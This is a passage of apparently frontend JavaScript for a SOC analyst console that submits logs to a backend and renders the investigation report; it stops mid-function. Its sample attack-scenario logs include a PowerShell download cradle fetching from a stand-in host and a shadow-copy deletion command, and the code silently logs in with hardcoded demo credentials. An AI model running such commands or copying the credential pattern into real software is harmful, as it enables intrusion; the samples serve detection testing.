/* ═════════════════════════════════════════════════════════════
   SOC ANALYST TERMINAL — Frontend Logic
   Connects to FastAPI at http://localhost:8000
   Renders full pipeline output: anomaly, threat intel,
   attack graph, MITRE techniques, LLM explanation + actions.
═════════════════════════════════════════════════════════════ */

// Configuration: Update this with your Render backend URL once deployed
const PROD_API_URL = 'https://your-render-backend-url.onrender.com';
const API = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') 
    ? 'http://localhost:8000' 
    : PROD_API_URL;
const TIMEOUT_MS = 300_000; // 5 minutes
let agentMode = true; // Agent mode on by default

/* ─── JWT Token Management (Silent Background) ─────────────── */
let authToken = localStorage.getItem('authToken') || null;

function getAuthHeaders() {
  if (!authToken) return { 'Content-Type': 'application/json' };
  return {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${authToken}`
  };
}

async function silentLogin() {
  // Auto-login with demo credentials in background
  try {
    const res = await fetch(`${API}/auth/token`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: "analyst", password: "password123" })
    });
    
    if (res.ok) {
      const data = await res.json();
      authToken = data.access_token;
      localStorage.setItem('authToken', authToken);
      return true;
    }
  } catch (err) {
    // Silent fail - continue anyway
  }
  return false;
}

function isAuthenticated() {
  return authToken !== null;
}

/* ─── Scenario presets ──────────────────────────────────────── */
const SCENARIOS = {
  bruteforce:
`2024-01-15 03:22:11 Failed password for admin from 185.220.101.5 port 54231 ssh2
2024-01-15 03:22:14 Failed password for admin from 185.220.101.5 port 54234 ssh2
2024-01-15 03:22:17 Failed password for root from 185.220.101.5 port 54237 ssh2
2024-01-15 03:22:20 Failed password for ubuntu from 185.220.101.5 port 54240 ssh2
2024-01-15 03:22:23 Failed password for administrator from 185.220.101.5 port 54243 ssh2
2024-01-15 03:22:31 Accepted password for admin from 185.220.101.5 port 54251 ssh2
2024-01-15 03:22:31 pam_unix(sshd:session): session opened for user admin by (uid=0)
2024-01-15 03:22:45 sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
2024-01-15 03:23:10 Suspicious process: mimikatz executed as root (hash: d38e2f6b...)`,

  lateral:
`2024-01-15 09:14:03 User jsmith authenticated to WORKSTATION-01 via NTLM
2024-01-15 09:14:45 PsExec executed on FILESERVER-02 from WORKSTATION-01 by jsmith
2024-01-15 09:15:12 Net use \\\\FILESERVER-02\\ADMIN$ established from WORKSTATION-01
2024-01-15 09:15:20 cmd.exe launched as SYSTEM on FILESERVER-02 remotely
2024-01-15 09:16:05 Mimikatz process detected on FILESERVER-02 (hash: d38e2f6b...)
2024-01-15 09:16:40 LSASS memory access by non-system process on FILESERVER-02
2024-01-15 09:17:10 Pass-the-hash attempt to DC-01 from FILESERVER-02 using administrator hash
2024-01-15 09:17:55 Successful authentication to DC-01 from FILESERVER-02 (NTLM, administrator)`,

  exfil:
`2024-01-15 14:30:01 Large file transfer initiated from 192.168.1.105 to 45.33.32.156
2024-01-15 14:30:15 DNS query storm: 192.168.1.105 querying suspicious.exfil-domain.ru
2024-01-15 14:31:00 Outbound traffic spike: 2.4 GB via port 443 to 45.33.32.156 in 60 seconds
2024-01-15 14:32:10 7zip compression of /var/data/customers/ detected on 192.168.1.105
2024-01-15 14:32:45 Encrypted archive uploaded via HTTPS to cloud storage (45.33.32.156)
2024-01-15 14:33:20 Base64-encoded payloads in DNS TXT records from 192.168.1.105
2024-01-15 14:34:55 DLP alert: PII data pattern matched in outbound traffic from 192.168.1.105`,

  ransomware:
`2024-01-15 22:01:05 Suspicious macro execution in Word document: invoice_Q4.docm
2024-01-15 22:01:10 PowerShell.exe spawned by WINWORD.EXE (parent PID 4832)
2024-01-15 22:01:15 PowerShell download cradle: IEX(New-Object Net.WebClient).DownloadString('http://evil.ru/payload')
2024-01-15 22:01:22 C2 beacon established to 91.108.4.1:8080 from HOST-FINANCE-03
2024-01-15 22:02:00 Volume Shadow Copy deletion: vssadmin delete shadows /all /quiet
2024-01-15 22:02:10 Mass file rename detected: .docx -> .locked on FILESERVER-01 shares
2024-01-15 22:02:40 Backup service stopped: veeambackupsvc terminated by ransomware process
2024-01-15 22:03:00 README_DECRYPT.txt created in 1,452 directories on FILESERVER-01`,
};

/* ─── State ─────────────────────────────────────────────────── */
let activeScenario = null;
let elapsedTimer   = null;
let rawReport      = '';

/* ─── DOM refs ───────────────────────────────────────────────── */
const logInput  = document.getElementById('log-input');
const lineCount = document.getElementById('line-count');
const charCount = document.getElementById('char-count');
const runBtn    = document.getElementById('run-btn');
const runLabel  = document.getElementById('run-label');

/* ─── Clock ─────────────────────────────────────────────────── */
function updateClock() {
  const el = document.getElementById('clock');
  if (!el) return;
  const now = new Date();
  el.textContent = now.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
}
updateClock();
setInterval(updateClock, 1000);

/* ─── API health check ───────────────────────────────────────── */
async function checkAPI() {
  const chip = document.getElementById('api-status');
  const txt  = document.getElementById('status-text');
  
  if (!chip || !txt) return false;
  
  try {
    const res = await fetch(`${API}/health`, { 
      signal: AbortSignal.timeout(3000),
      method: 'GET'
    });
    
    if (res.status === 200) {
      chip.classList.add('online');
      chip.classList.remove('offline');
      txt.textContent = 'API ONLINE';
      console.log('✅ API is online');
      return true;
    } else {
      throw new Error(`Status: ${res.status}`);
    }
  } catch (err) {
    console.log('❌ API check failed:', err.message);
    txt.textContent = 'API OFFLINE';
    chip.classList.remove('online');
    chip.classList.add('offline');
    return false;
  }
}

// Check API immediately on load
async function initAPI() {
  console.log('Checking API status...');
  const isOnline = await checkAPI();
  if (isOnline) {
    feedEntry(`API connected — ${API}`, 'feed-ok');
  } else {
    feedEntry('API offline — start uvicorn on port 8000', 'feed-warn');
  }
  
  // Then check periodically every 5 seconds
  setInterval(async () => {
    await checkAPI();
    // Update agent entity count from health endpoint
    if (agentMode) {
      try {
        const hRes = await fetch(`${API}/health`, { signal: AbortSignal.timeout(2000) });
        if (hRes.ok) {
          const hData = await hRes.json();
          const countEl = document.getElementById('agent-entity-count');
          if (countEl && hData.agent_entities_tracked !== undefined) {
            countEl.textContent = hData.agent_entities_tracked;
          }
        }
      } catch(_) {}
    }
  }, 5000);
}

/* ─── Detection log feed ─────────────────────────────────────── */
function feedEntry(text, cls = 'feed-info') {
  const feed = document.getElementById('feed');
  if (!feed) return;
  const el = document.createElement('div');
  el.className = `feed-entry ${cls}`;
  const ts = new Date().toISOString().slice(11, 19);
  el.textContent = `${ts}  ${text}`;
  feed.appendChild(el);
  feed.scrollTop = feed.scrollHeight;
  // Keep feed lean
  while (feed.children.length > 80) feed.removeChild(feed.firstChild);
}

function clearLog() {
  const feed = document.getElementById('feed');
  if (feed) feed.innerHTML = '';
}

/* ─── Char / line counter ────────────────────────────────────── */
logInput.addEventListener('input', updateCounts);

function updateCounts() {
  const val = logInput.value;
  const lines = val ? val.split('\n').length : 0;
  lineCount.textContent = `${lines} line${lines !== 1 ? 's' : ''}`;
  charCount.textContent = `${val.length.toLocaleString()} chars`;
}

/* ─── Scenario loader ────────────────────────────────────────── */
function loadScenario(name) {
  // toggle off
  if (activeScenario === name) {
    logInput.value = '';
    updateCounts();
    document.getElementById(`s-${name}`)?.classList.remove('active');
    activeScenario = null;
    feedEntry(`Scenario cleared: ${name}`, 'feed-info');
    return;
  }

  // deactivate previous
  if (activeScenario) {
    document.getElementById(`s-${activeScenario}`)?.classList.remove('active');
  }

  logInput.value = SCENARIOS[name] || '';
  updateCounts();
  document.getElementById(`s-${name}`)?.classList.add('active');
  activeScenario = name;
  feedEntry(`Loaded scenario: ${name.toUpperCase()}`, 'feed-info');
}

/* ─── Clear input ────────────────────────────────────────────── */
function clearInput() {
  logInput.value = '';
  updateCounts();
  if (activeScenario) {
    document.getElementById(`s-${activeScenario}`)?.classList.remove('active');
    activeScenario = null;
  }
  // Clear filename display
  const fn = document.getElementById('t-filename');
  if (fn) fn.textContent = '';
  feedEntry('Input cleared', 'feed-sys');
}

/* ─── File Upload (button) ───────────────────────────────────── */
function handleFileUpload(event) {
  const file = event.target.files?.[0];
  if (!file) return;
  loadFileContent(file);
  // Reset input so same file can be re-selected
  event.target.value = '';
}

function loadFileContent(file) {
  const MAX_BYTES = 512_000; // 512 KB sanity cap
  if (file.size > MAX_BYTES) {
    feedEntry(`File too large (${(file.size / 1024).toFixed(0)} KB) — showing first 512 KB`, 'feed-warn');
  }

  const reader = new FileReader();

  reader.onload = (e) => {
    let text = e.target.result;
    const name = file.name.toLowerCase();

    if (name.endsWith('.csv')) {
      // Check if it's a network flow CSV (like CIC-IDS2017)
      const firstLine = text.split('\n')[0] || '';
      if (firstLine.toLowerCase().includes('destination port') || firstLine.toLowerCase().includes('flow duration')) {
        feedEntry(`Network Flow CSV detected → ${(text.split('\n').length - 1)} flows`, 'feed-ok');
      } else {
        // Convert generic CSV to readable log text
        text = parseCSV(text);
        feedEntry(`CSV parsed → ${text.split('\n').length} log lines`, 'feed-ok');
      }
    } else {
      feedEntry(`Loaded: ${file.name} (${(file.size / 1024).toFixed(1)} KB)`, 'feed-ok');
    }

    setFileInTerminal(text, file.name);
  };

  reader.onerror = () => {
    feedEntry(`Failed to read file: ${file.name}`, 'feed-err');
  };

  // Read as text (limit to MAX_BYTES for large files)
  reader.readAsText(file.slice(0, MAX_BYTES));
}

function setFileInTerminal(text, filename) {
  // Deactivate any loaded scenario
  if (activeScenario) {
    document.getElementById(`s-${activeScenario}`)?.classList.remove('active');
    activeScenario = null;
  }

  logInput.value = text;
  updateCounts();

  // Show filename in terminal chrome
  const fn = document.getElementById('t-filename');
  if (fn) fn.textContent = filename;
}

/* ─── CSV Parser ─────────────────────────────────────────────── */
/*
  Converts CSV rows into plain-text log lines the pipeline can parse.

  Strategy:
  1. Read the header row to understand column names
  2. Look for columns that match common log field names
     (timestamp, message, event, description, severity, source, etc.)
  3. For each data row, build a one-line string: "col: value  col: value …"
  This gives the normalizer / event extractor enough raw text to work with.
*/
function parseCSV(csvText) {
  const lines = csvText.split(/\r?\n/).filter(l => l.trim());
  if (lines.length < 2) return csvText; // Not enough rows

  // Parse a single CSV row respecting quoted fields
  function parseRow(line) {
    const fields = [];
    let cur = '', inQ = false;
    for (let i = 0; i < line.length; i++) {
      const c = line[i];
      if (c === '"') { inQ = !inQ; }
      else if (c === ',' && !inQ) { fields.push(cur.trim()); cur = ''; }
      else { cur += c; }
    }
    fields.push(cur.trim());
    return fields;
  }

  const headers = parseRow(lines[0]).map(h => h.replace(/^"|"$/g, '').toLowerCase());

  // High-value columns to include (pattern matching)
  const IMPORTANT = [
    /time|date|ts/,
    /message|msg|description|detail|event/,
    /source|src|origin|host|hostname|computer/,
    /ip|address|addr|remote/,
    /user|account|principal|logon/,
    /action|activity|operation/,
    /severity|level|priority/,
    /process|command|cmdline|executable/,
  ];

  // Pick column indices that match at least one important pattern
  const keepIdx = headers.reduce((acc, h, i) => {
    if (IMPORTANT.some(rx => rx.test(h))) acc.push(i);
    return acc;
  }, []);

  // If no columns matched, just include all columns
  const idxList = keepIdx.length > 0 ? keepIdx : headers.map((_, i) => i);

  const outputLines = lines.slice(1).map(line => {
    const row = parseRow(line);
    return idxList
      .map(i => {
        const val = (row[i] || '').replace(/^"|"$/g, '').trim();
        return val ? `${headers[i]}: ${val}` : null;
      })
      .filter(Boolean)
      .join('  ');
  }).filter(l => l.length > 0);

  return outputLines.join('\n');
}

/* ─── Drag and Drop ─────────────────────────────────────────── */
(function initDragDrop() {
  const dropZone = document.getElementById('drop-zone');
  // Use the left column as the drag target area
  const leftCol  = document.querySelector('.col-left');
  if (!leftCol || !dropZone) return;

  let dragCounter = 0; // track nested dragenter/dragleave pairs

  leftCol.addEventListener('dragenter', (e) => {
    e.preventDefault();
    dragCounter++;
    dropZone.classList.add('active');
    logInput.classList.add('drag-over');
  });

  leftCol.addEventListener('dragleave', (e) => {
    dragCounter--;
    if (dragCounter <= 0) {
      dragCounter = 0;
      dropZone.classList.remove('active');
      logInput.classList.remove('drag-over');
    }
  });

  leftCol.addEventListener('dragover', (e) => {
    e.preventDefault(); // required to allow drop
  });

  leftCol.addEventListener('drop', (e) => {
    e.preventDefault();
    dragCounter = 0;
    dropZone.classList.remove('active');
    logInput.classList.remove('drag-over');

    const file = e.dataTransfer?.files?.[0];
    if (!file) return;

    const allowed = ['.log', '.txt', '.csv', '.json'];
    const ext = '.' + file.name.split('.').pop().toLowerCase();

    if (!allowed.includes(ext)) {
      feedEntry(`Unsupported file type: ${ext}. Use .log .txt .csv .json`, 'feed-warn');
      return;
    }

    loadFileContent(file);
  });
})();

/* ─── UI state switches ──────────────────────────────────────── */
const STATES = ['empty-state', 'loading-state', 'error-state', 'report'];

function showState(id) {
  STATES.forEach(s => {
    const el = document.getElementById(s);
    if (!el) return;
    el.classList.toggle('hidden', s !== id);
  });
}

/* ─── Pipeline step animation ────────────────────────────────── */
const STEP_DELAYS = [600, 1200, 2200, 3000, 4000, 6000, 9000, 11000];
const STEP_LABELS = ['PARSE', 'EXTRACT', 'LSTM', 'INTEL', 'RAG', 'LLM…', 'GRAPH', 'AGENT'];

function startPipelineAnimation() {
  const totalSteps = agentMode ? 8 : 7;
  // Show/hide agent step
  const agentStep = document.getElementById('ps-7');
  if (agentStep) agentStep.classList.toggle('hidden', !agentMode);

  // Reset all steps
  for (let i = 0; i < totalSteps; i++) {
    const el = document.getElementById(`ps-${i}`);
    if (el) {
      el.className = el.className.includes('agent-step') ? 'pipe-step agent-step' : 'pipe-step';
      el.querySelector('.pipe-status').textContent = '';
    }
  }

  for (let i = 0; i < totalSteps; i++) {
    const delay = STEP_DELAYS[i];
    setTimeout(() => {
      if (i > 0) {
        const prev = document.getElementById(`ps-${i - 1}`);
        if (prev) {
          prev.classList.add('ps-done');
          prev.querySelector('.pipe-status').textContent = 'DONE';
        }
      }
      const cur = document.getElementById(`ps-${i}`);
      if (cur) {
        cur.classList.add('ps-active');
        cur.querySelector('.pipe-status').textContent = STEP_LABELS[i];
      }
    }, delay);
  }
}

function finishPipelineAnimation() {
  const totalSteps = agentMode ? 8 : 7;
  for (let i = 0; i < totalSteps; i++) {
    const el = document.getElementById(`ps-${i}`);
    if (el) {
      el.classList.add('ps-done');
      el.querySelector('.pipe-status').textContent = 'DONE';
    }
  }
}

/* ─── Elapsed timer ──────────────────────────────────────────── */
function startElapsed() {
  let s = 0;
  const el = document.getElementById('elapsed-val');
  stopElapsed();
  elapsedTimer = setInterval(() => {
    s++;
    if (el) el.textContent = `${s}s`;
  }, 1000);
}

function stopElapsed() {
  if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
}

/* ─── Main investigation ─────────────────────────────────────── */
async function investigate() {
  const logs = logInput.value.trim();
  if (!logs) {
    logInput.focus();
    logInput.style.outline = '1px solid var(--red)';
    setTimeout(() => { logInput.style.outline = ''; }, 1200);
    feedEntry('No log input provided', 'feed-warn');
    return;
  }

  // Disable button
  runBtn.disabled = true;
  runLabel.textContent = 'RUNNING…';

  showState('loading-state');
  startPipelineAnimation();
  startElapsed();

  feedEntry('Investigation started', 'feed-info');
  feedEntry(`Input: ${logs.split('\n').length} lines`, 'feed-info');
  if (agentMode) feedEntry('Agent mode: ON', 'feed-found');

  const ctrl    = new AbortController();
  const timeout = setTimeout(() => ctrl.abort(), TIMEOUT_MS);

  // Build request body — add entity_id if in agent mode
  const endpoint = agentMode ? `${API}/investigate/agent` : `${API}/investigate`;
  const body = { logs };
  if (agentMode) {
    const eid = document.getElementById('entity-id-input')?.value?.trim();
    if (eid) body.entity_id = eid;
  }

  try {
    const res = await fetch(endpoint, {
      method:  'POST',
      headers: getAuthHeaders(),
      body:    JSON.stringify(body),
      signal:  ctrl.signal,
    });

    clearTimeout(timeout);

    if (!res.ok) {
      if (res.status === 401 || res.status === 403) {
        feedEntry('Authentication expired. Retrying...', 'feed-warn');
        await silentLogin();
        const retryRes = await fetch(endpoint, {
          method:  'POST',
          headers: getAuthHeaders(),
          body:    JSON.stringify(body),
          signal:  ctrl.signal,
        });
        
        if (!retryRes.ok) {
          throw new Error(`Authentication failed: ${retryRes.status}`);
        }
        
        const data = await retryRes.json();
        finishPipelineAnimation();
        if (agentMode) {
          renderAgentReport(data);
        } else {
          rawReport = data.investigation || data.llm_explanation || '';
          renderReport(data);
        }
        showState('report');
        document.getElementById('api-status')?.classList.add('online');
        document.getElementById('status-text').textContent = 'API ONLINE';
        feedEntry(`Investigation complete — severity: ${data.severity || '?'}`, 'feed-ok');
        return;
      }
      const err = await res.json().catch(() => ({}));
      throw new Error(err.detail || `HTTP ${res.status}`);
    }

    const data = await res.json();
    finishPipelineAnimation();

    if (agentMode) {
      renderAgentReport(data);
    } else {
      rawReport = data.investigation || data.llm_explanation || '';
      renderReport(data);
    }
    showState('report');

    document.getElementById('api-status')?.classList.add('online');
    document.getElementById('status-text').textContent = 'API ONLINE';
    feedEntry(`Investigation complete — severity: ${data.severity || '?'}`, 'feed-ok');
    if (agentMode && data.correlation_depth > 0) {
      feedEntry(`Agent: ${data.correlation_depth} sessions correlated`, 'feed-found');
      if (data.campaign_pattern) {
        feedEntry(`Agent: campaign → ${data.campaign_pattern.replace(/_/g, ' ')}`, 'feed-found');
      }
    }
    if (agentMode && data.decision) {
      const decClass = data.decision === 'AUTO_REMEDIATE' ? 'feed-err' : data.decision === 'ESCALATE_L2' ? 'feed-warn' : 'feed-info';
      feedEntry(`Agent decision: ${data.decision.replace(/_/g, ' ')} (${((data.confidence ?? 0) * 100).toFixed(0)}%)`, decClass);
    }
    if (agentMode && data.why_flagged?.length > 0) {
      data.why_flagged.forEach(r => feedEntry(`⚑ ${r}`, 'feed-found'));
    }

  } catch (err) {
    clearTimeout(timeout);
    let msg;
    if (err.name === 'AbortError') {
      msg = 'Request timed out after 5 minutes. The local LLM might be generating slowly on your hardware — please retry.';
      feedEntry('Request timed out', 'feed-err');
    } else if (/fetch|failed to fetch/i.test(err.message)) {
      msg = 'Cannot reach backend API. Make sure uvicorn is running on port 8000.';
      feedEntry('Cannot reach API', 'feed-err');
    } else {
      msg = err.message;
      feedEntry(`Error: ${err.message}`, 'feed-err');
    }
    document.getElementById('error-msg').textContent = msg;
    showState('error-state');
  } finally {
    stopElapsed();
    runBtn.disabled  = false;
    runLabel.textContent = 'RUN INVESTIGATION';
  }
}

/* ─── Report rendering ───────────────────────────────────────── */
function renderReport(data) {
  /* ── Top bar ── */
  document.getElementById('report-id').textContent =
    `INC-${(data.incident_id || '').slice(0, 8).toUpperCase()}`;
  document.getElementById('report-ts').textContent =
    data.timestamp ? new Date(data.timestamp).toUTCString() : '—';

  const sev = (data.severity || 'UNKNOWN').toUpperCase();
  const pill = document.getElementById('severity-pill');
  pill.textContent = sev;
  pill.className   = `severity-pill sev-${sev}`;

  /* ── Metric strip ── */
  const anomaly = typeof data.anomaly_score === 'number' ? data.anomaly_score : null;
  if (anomaly !== null) {
    document.getElementById('m-anomaly').textContent = anomaly.toFixed(3);
    setBar('m-anomaly-bar', anomaly * 100, severityColor(anomaly, 'anomaly'));
    feedEntry(`Anomaly score: ${anomaly.toFixed(4)}`,
      anomaly >= 0.7 ? 'feed-err' : anomaly >= 0.4 ? 'feed-warn' : 'feed-ok');
  }

  const conf = typeof data.confidence === 'number' ? data.confidence : null;
  if (conf !== null) {
    document.getElementById('m-confidence').textContent = `${(conf * 100).toFixed(0)}%`;
    setBar('m-confidence-bar', conf * 100, '#4a90d9');
  }

  const tiRisk = data.threat_intel?.overall_risk || '—';
  document.getElementById('m-risk').textContent = tiRisk;
  if (tiRisk !== '—') {
    const riskColors = { CRITICAL: 'var(--red)', HIGH: 'var(--amber)', MEDIUM: 'var(--blue)', LOW: 'var(--green)' };
    document.getElementById('m-risk').style.color = riskColors[tiRisk] || '';
    feedEntry(`Threat intel risk: ${tiRisk}`,
      tiRisk === 'CRITICAL' || tiRisk === 'HIGH' ? 'feed-err' : 'feed-info');
  }

  document.getElementById('m-events').textContent   = data.events_analyzed ?? '—';
  document.getElementById('m-sessions').textContent = data.session_count ?? '—';

  /* ── Kill chain ── */
  const kc = data.kill_chain_stage || data.attack_stage || '—';
  document.getElementById('r-killchain').textContent = kc;
  feedEntry(`Kill-chain stage: ${kc}`, 'feed-found');

  /* ── MITRE techniques ── */
  const techniques = data.mitre_techniques || [];
  const mitreEl = document.getElementById('r-mitre');
  if (techniques.length > 0 && techniques[0] !== 'Unknown') {
    mitreEl.innerHTML = techniques.map(t =>
      `<span class="mitre-tag">${esc(t)}</span>`
    ).join('');
    feedEntry(`MITRE: ${techniques.join(', ')}`, 'feed-found');
  } else {
    mitreEl.textContent = '—';
  }

  /* ── Attack graph ── */
  const graph  = data.attack_graph || {};
  const path   = graph.attack_path || [];
  const graphEl = document.getElementById('r-graph');
  if (path.length > 0) {
    const nodes = path.map(n => `<span class="graph-node">${esc(n)}</span>`);
    const withArrows = nodes.join('<span class="graph-arrow">→</span>');
    graphEl.innerHTML = `<div class="graph-path">${withArrows}</div>`;
    if (graph.stages?.length > 0) {
      const stageDiv = document.createElement('div');
      stageDiv.style.cssText = 'font-size:0.68rem;color:var(--text-2);margin-top:6px;';
      stageDiv.textContent = graph.stages.join(' → ');
      graphEl.appendChild(stageDiv);
    }
  } else {
    graphEl.textContent = '—';
  }

  /* ── Threat intel ── */
  const indicators = data.threat_intel?.indicators || [];
  const intelEl = document.getElementById('r-intel');
  const malicious = indicators.filter(i => i.is_malicious);

  if (malicious.length > 0) {
    intelEl.innerHTML = malicious.slice(0, 6).map(i => {
      const typeClass = { ip: 'ib-ip', command: 'ib-command', hash: 'ib-hash' }[i.indicator_type] || 'ib-ip';
      return `<div class="intel-entry">
        <span class="intel-badge ${typeClass}">${esc(i.indicator_type.toUpperCase())}</span>
        <span class="intel-text">${esc(i.indicator)}<br><small style="color:var(--text-2)">${esc(i.threat_description || '')}</small></span>
        <span class="intel-risk">${i.risk_score}/100</span>
      </div>`;
    }).join('');
    feedEntry(`${malicious.length} malicious indicator(s) found`, 'feed-err');
  } else {
    intelEl.textContent = 'No malicious indicators detected.';
    feedEntry('No malicious indicators detected', 'feed-ok');
  }

  /* ── RAG Knowledge Snippets ── */
  const ragEl      = document.getElementById('r-rag');
  const ragSnippets = data.rag_snippets || [];
  const ragQuery    = data.rag_query || '';

  if (ragSnippets.length > 0) {
    let html = '';
    
    // Show the RAG query used
    if (ragQuery) {
      html += `<div class="rag-query">
        <span class="rag-query-label">Query:</span>
        <span class="rag-query-text">${esc(ragQuery)}</span>
      </div>`;
    }
    
    // Show retrieved snippets with enhanced parsing
    html += '<div class="rag-snippets-container">';
    ragSnippets.slice(0, 5).forEach((snippet, i) => {
      // Extract Technique ID and Name
      const techIdMatch = snippet.match(/Technique ID:\s*([T\d.]+)/);
      const techNameMatch = snippet.match(/Technique Name:\s*([^\n]+)/);
      const tacticsMatch = snippet.match(/Tactics:\s*([^\n]+)/);
      const descMatch = snippet.match(/Description:\s*([\s\S]*?)(?:Technique ID:|$)/);
      
      const techId = techIdMatch ? techIdMatch[1] : '';
      const techName = techNameMatch ? techNameMatch[1].trim() : '';
      const tactics = tacticsMatch ? tacticsMatch[1].trim().split(',').map(t => t.trim()) : [];
      const description = descMatch ? descMatch[1].trim().slice(0, 200) : snippet.slice(0, 200);
      
      html += `<div class="rag-snippet" data-index="${i}">
        <span class="rag-snippet-num">${i + 1}</span>
        <div class="rag-snippet-content">
          ${techId ? `<div class="rag-technique-id">${esc(techId)}</div>` : ''}
          ${techName ? `<div class="rag-technique-name">${esc(techName)}</div>` : ''}
          ${tactics.length > 0 ? `<div class="rag-tactics">${tactics.map(t => `<span class="rag-tactic">${esc(t)}</span>`).join('')}</div>` : ''}
          <div class="rag-description">${esc(description)}${description.length > 200 ? '…' : ''}</div>
        </div>
      </div>`;
    });
    html += '</div>';
    
    ragEl.innerHTML = html;
    feedEntry(`RAG: ${ragSnippets.length} MITRE ATT&CK passage(s) retrieved`, 'feed-found');
  } else {
    ragEl.innerHTML = '<span style="color:var(--text-2)">No MITRE ATT&CK passages retrieved.</span>';
    feedEntry('RAG: no passages retrieved', 'feed-warn');
  }

  /* ── LLM Explanation ── */
  const raw = data.llm_explanation || data.investigation || '';
  const explEl = document.getElementById('r-explanation');
  const explanation = extractSection(raw, 'explanation') || raw;
  explEl.innerHTML = `<div class="explanation-text">${formatText(explanation)}</div>`;

  /* ── Recommended response ── */
  const actions = data.recommended_response || [];
  const respEl  = document.getElementById('r-response');
  if (actions.length > 0) {
    respEl.innerHTML = actions.map((a, i) =>
      `<div class="response-item">
        <span class="response-num">${String(i + 1).padStart(2, '0')}</span>
        <span>${esc(a)}</span>
      </div>`
    ).join('');
  } else {
    // Try extracting from raw LLM output
    const rawActions = extractSection(raw, 'recommended_actions');
    if (rawActions) {
      const lines = rawActions.split('\n')
        .map(l => l.replace(/^[\s\*\-•\d\.)]+/, '').trim())
        .filter(l => l.length > 5);
      respEl.innerHTML = lines.slice(0, 8).map((a, i) =>
        `<div class="response-item">
          <span class="response-num">${String(i + 1).padStart(2, '0')}</span>
          <span>${esc(a)}</span>
        </div>`
      ).join('');
    } else {
      respEl.textContent = 'No specific actions returned.';
    }
  }

  /* ── Raw output ── */
  document.getElementById('raw-body').textContent = raw;
}

/* ─── Helpers ─────────────────────────────────────────────────── */
function setBar(id, pct, color) {
  const el = document.getElementById(id);
  if (!el) return;
  el.style.width = `${Math.min(pct, 100).toFixed(1)}%`;
  el.style.background = color;
}

function severityColor(score, type) {
  if (score >= 0.8) return 'var(--red)';
  if (score >= 0.5) return 'var(--amber)';
  if (score >= 0.2) return 'var(--blue)';
  return 'var(--green)';
}

function extractSection(text, sectionName) {
  const pattern = new RegExp(
    `(?:^|\\n)[\\s\\*-]*${sectionName.replace(/_/g, '[_\\s]?')}[:\\s]+([\\s\\S]*?)(?=\\n[\\s\\*-]*(?:attack[_\\s]stage|mitre[_\\s]technique|severity|confidence|explanation|recommended[_\\s]actions)[:\\s]|$)`,
    'im'
  );
  const m = text.match(pattern);
  return m ? m[1].trim() : null;
}

function formatText(text) {
  if (!text) return '<em style="color:var(--text-2)">Not available.</em>';
  // Strip markdown bold
  text = text.replace(/\*\*(.*?)\*\*/g, '$1');
  // Convert bullet lines to HTML list
  const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
  if (lines.length <= 1) return `<p>${esc(text.trim())}</p>`;
  const isList = lines.every(l => /^[-•*\d.]/.test(l));
  if (isList) {
    const items = lines.map(l => l.replace(/^[-•*\d\.)]+\s*/, '').trim()).filter(Boolean);
    return `<ul>${items.map(i => `<li>${esc(i)}</li>`).join('')}</ul>`;
  }
  return lines.map(l => `<p>${esc(l)}</p>`).join('');
}

function esc(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/* ─── Copy report ─────────────────────────────────────────────── */
function copyReport() {
  if (!rawReport) return;
  navigator.clipboard.writeText(rawReport).then(() => {
    const btn = document.getElementById('copy-btn');
    if (!btn) return;
    const orig = btn.innerHTML;
    btn.textContent = 'COPIED';
    btn.style.color = 'var(--green)';
    setTimeout(() => {
      btn.innerHTML = orig;
      btn.style.color = '';
    }, 1800);
  });
}

/* ─── Agent Mode Toggle ──────────────────────────────────────── */
document.getElementById('agent-mode-toggle')?.addEventListener('change', (e) => {
  agentMode = e.target.checked;
  const config = document.getElementById('agent-config');
  if (config) config.style.display = agentMode ? '' : 'none';
  feedEntry(`Agent mode: ${agentMode ? 'ENABLED' : 'DISABLED'}`, agentMode ? 'feed-found' : 'feed-info');
});

/* ─── Agent Report Renderer ──────────────────────────────────── */
function renderAgentReport(data) {
  // Debug: log received data
  console.log('[Agent Report] Received data:', {
    correlation_depth: data.correlation_depth,
    campaign_pattern: data.campaign_pattern,
    incident_type: data.incident_type,
    confidence: data.confidence,
    decision: data.decision,
    compound_anomaly_score: data.compound_anomaly_score,
  });

  // First, render the standard pipeline report from pipeline_report
  const pr = data.pipeline_report || {};
  renderReport(pr);

  // Override top-level metrics with agent values
  const sev = (data.severity || 'UNKNOWN').toUpperCase();
  const pill = document.getElementById('severity-pill');
  if (pill) {
    pill.textContent = sev;
    pill.className = `severity-pill sev-${sev}`;
  }

  // Update anomaly score to show agent compound score
  const compoundAnomaly = data.compound_anomaly_score ?? data.anomaly_score ?? 0;
  if (compoundAnomaly !== null && compoundAnomaly !== undefined) {
    document.getElementById('m-anomaly').textContent = compoundAnomaly.toFixed(3);
    setBar('m-anomaly-bar', Math.min(compoundAnomaly * 100, 100), severityColor(compoundAnomaly, 'anomaly'));
  }

  // Update confidence
  const conf = data.confidence ?? 0;
  if (conf !== null && conf !== undefined) {
    document.getElementById('m-confidence').textContent = `${(conf * 100).toFixed(0)}%`;
    setBar('m-confidence-bar', Math.min(conf * 100, 100), '#4a90d9');
  }

  // ── Show Agent Intelligence Panel ──
  const agentPanel = document.getElementById('agent-panel');
  if (agentPanel) {
    agentPanel.classList.remove('hidden');

    // Compound anomaly
    const amCompound = document.getElementById('am-compound');
    if (amCompound) {
      const compScore = data.compound_anomaly_score ?? data.anomaly_score ?? 0;
      amCompound.textContent = compScore.toFixed(4);
      const barColor = severityColor(compScore, 'anomaly');
      amCompound.style.color = barColor;
      setBar('am-compound-bar', Math.min(compScore * 100, 100), barColor);
    }

    // Correlation depth — show as number or "Linked from previous"
    const amDepth = document.getElementById('am-depth');
    if (amDepth) {
      const depth = data.correlation_depth ?? 0;
      console.log('[Agent] Correlation depth value:', depth, typeof depth);
      if (depth > 0) {
        amDepth.textContent = `${depth} sessions`;
        amDepth.style.color = 'var(--blue)';
      } else {
        amDepth.textContent = 'None';
        amDepth.style.color = 'var(--text-2)';
      }
    }

